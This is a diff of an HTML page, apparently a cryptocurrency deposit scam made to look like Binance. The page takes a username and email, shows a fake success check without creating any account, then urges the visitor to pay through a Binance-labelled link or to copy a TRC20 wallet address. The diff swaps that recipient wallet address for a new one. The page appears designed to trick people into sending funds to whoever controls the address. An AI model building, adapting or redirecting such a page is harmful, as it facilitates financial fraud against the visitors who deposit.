@@ -79,7 +79,7 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 <div class="input-group"><label for="displayname">Username</label><input type="text" id="displayname" placeholder="Enter your username" required></div>
 <div class="input-group"><label for="username">Email Address</label><input type="text" id="username" placeholder="example@gmail.com" required></div>
 
-<!-- تعديل هنا: استدعاء الدالة البرمجية الجديدة للتحقق وإظهار الحركة الخضراء -->
+<!-- استدعاء الدالة البرمجية الجديدة للتحقق وإظهار الحركة الخضراء -->
 <button type="button" onclick="handleSubmitAndShowCheck()" class="submit-btn-pulse">CREATE ACCOUNT</button>
 
 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
@@ -97,7 +97,7 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 <a href="https://binance.com" target="_blank" class="binance-btn-final">⚡ الدفع عبر بايننس طلب دفع</a>
 <div class="manual-deposit-box">
 <p style="font-size: 14px; margin-bottom: 10px; color: #ffffff; font-weight: 700; direction: ltr; text-align: center;">أو للإيداع من باقي المحافظ الرقمية (شبكة TRC20):</p>
-<div id="cryptoAddress" class="crypto-address-container">THJN4XBKxbZNYsw7YAHmNiZSupn3KVEDFP</div>
+<div id="cryptoAddress" class="crypto-address-container">TE3WaPPsUtihqo9jZbS8TK1eRDf4Vg2XLy</div>
 <button type="button" onclick="copyCryptoAddress()" class="copy-btn-style">نسخ عنوان المحفظة</button>
 </div>
 </div>
@@ -105,44 +105,32 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 </div>
 
 <script>
-// دالة إظهار علامة الصح والتحول للخطوة الثانية
 function handleSubmitAndShowCheck() {
-    var usernameInput = document.getElementById('displayname');
-    var emailInput = document.getElementById('username');
-    
-    // التحقق من تعبئة الحقول المطلوبة أولاً
-    if (!usernameInput.value || !emailInput.value) {
-        alert("يرجى ملء الحقول المطلوبة أولاً!");
+    var username = document.getElementById('username').value;
+    var displayname = document.getElementById('displayname').value;
+    if(username === "" || displayname === "") {
+        alert("يرجى ملء الحقول المطلوبة أولاً.");
         return;
     }
-    
-    // إظهار نافذة علامة الصح الخضراء
-    var alertBox = document.getElementById('successAlert');
-    alertBox.style.display = 'flex';
-    
-    // إخفاء النافذة والانتقال للخطوة الثانية بعد ثانيتين تلقائياً
-    setTimeout(function() {
-        alertBox.style.display = 'none';
-        goToStep2();
+    document.getElementById('successAlert').style.display = 'flex';
+    setTimeout(function(){
+        document.getElementById('successAlert').style.display = 'none';
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
     }, 2000);
-}
-
-function goToStep2() {
-    document.getElementById('step1').style.display = 'none';
-    document.getElementById('step2').style.display = 'block';
-}
-
-function alertNoAccount() {
-    alert("يرجى إنشاء حساب جديد للمتابعة.");
 }
 
 function copyCryptoAddress() {
     var addressText = document.getElementById('cryptoAddress').innerText;
     navigator.clipboard.writeText(addressText).then(function() {
-        alert("تم نسخ المحفظة بنجاح!");
+        alert("تم نسخ عنوان المحفظة بنجاح!");
     }, function() {
-        alert("فشل النسخ، يرجى النسخ يدوياً.");
+        alert("فشل النسخ، يرجى نسخه يدوياً.");
     });
+}
+
+function alertNoAccount() {
+    alert("يرجى إنشاء حساب جديد أولاً لتتمكن من المتابعة.");
 }
 </script>
 
